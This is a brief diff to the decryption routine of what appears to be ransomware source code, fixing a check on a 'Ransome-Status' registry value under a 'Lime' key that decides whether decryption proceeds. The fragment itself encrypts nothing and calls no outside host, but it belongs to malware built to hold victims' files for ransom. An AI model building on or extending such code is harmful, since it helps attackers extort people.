@@ -20,7 +20,7 @@ Public Class Decryption
     Public Sub Dec(ByVal key As String)
         Try
             Dim readValue = My.Computer.Registry.GetValue("HKEY_CURRENT_USER\Software\Lime", "Ransome-Status", Nothing)
-            If readValue <> "Encrypted" Or readValue = "Decryption In progress..." Or readValue = "Encryption in progress..." Then
+            If readValue = "Decrypted" Or readValue = "Decryption In progress..." Or readValue = "Encryption in progress..." Then
                 Exit Sub
             End If
 
